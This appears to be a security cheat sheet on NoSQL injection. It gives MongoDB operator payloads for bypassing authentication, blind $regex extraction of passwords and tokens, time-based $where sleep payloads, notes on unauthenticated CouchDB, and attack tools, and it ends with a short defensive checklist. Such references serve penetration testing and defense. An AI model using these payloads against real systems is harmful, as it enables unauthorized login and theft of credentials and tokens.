# NoSQL Injection: 2026 Complete Reference

## MongoDB Operator Injection

MongoDB queries use JSON objects with comparison operators. Vulnerability arises when user input reaches query object as a JSON structure (not sanitized).

### Authentication Bypass Operators

| Operator | Payload | Effect |
|----------|---------|--------|
| `$ne` | `{"password": {"$ne": "x"}}` | Returns first user whose password != "x" |
| `$gt` | `{"password": {"$gt": ""}}` | Any non-empty string is > "" |
| `$regex` | `{"password": {"$regex": ".*"}}` | Matches any value |
| `$exists` | `{"password": {"$exists": true}}` | True if field exists |
| `$in` | `{"password": {"$in": ["", "admin"]}}` | Matches array values |
| `$nin` | `{"password": {"$nin": ["x"]}}` | Not in array |

### Common Injection Points
```json
// JSON body (Express body-parser)
{"username":"admin","password":{"$ne":""}}

// URL query parameter (bracket notation)
?username=admin&password[$ne]=

// POST form parameter
username=admin&password[$gt]=
```

PHP automatically converts `password[$ne]=x` into `{"password": {"$ne": "x"}}`.

## Blind Data Extraction via $regex

Extract data character by character using boolean signal (200 vs 403, different response length):
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
```

Extend one character at a time: `^a` → `^ad` → `^adm` → `^admi` → `^admin`

Works against any string field: passwords, API keys, reset tokens. Automate with `nosqli` CLI.

## Time-Based Detection via $where

`$where` evaluates JavaScript expressions server-side (enabled by default in MongoDB):
```json
{"$where": "sleep(5000)"}
{"$where": "function() { sleep(5000); return true; }"}
```

Conditional sleep for data extraction:
```json
{"$where": "this.password.match(/^a/) && sleep(5000)"}
```

### MongoDB Version Specifics
- v4.4+: Dropped BSON type 15 (JavaScript with scope) — but string `$where` still works
- MUST disable via `security.javascriptEnabled: false` in config
- Check version from error messages or info disclosure endpoints

## CouchDB Injection

### Pre-3.0 Party Mode
- Port 5984 accessible without auth
- `_users` database stores hashed passwords for all registered users
- Full read access to `_all_dbs` means entire data layer exposed
- 3.0+ enforces admin setup, but containers pulling 2.x images still expose this

## Tools
- **nosqli** (Go, actively maintained): Detection, boolean blind, timing attacks. Accepts Burp request files.
- **NoSQLMap** (Python, older): Menu-driven, MongoDB + CouchDB, dictionary attacks. Less maintained but covers more scenarios.

## Defensive Checklist
1. Always validate input types — reject objects where strings expected
2. Use strict schema validation (Mongoose `strict: true`)
3. Disable `$where` entirely (`security.javascriptEnabled: false`)
4. Sanitize query parameters — reject `$` prefixed keys
5. Use parameterized queries or MongoDB's Object mapping layer properly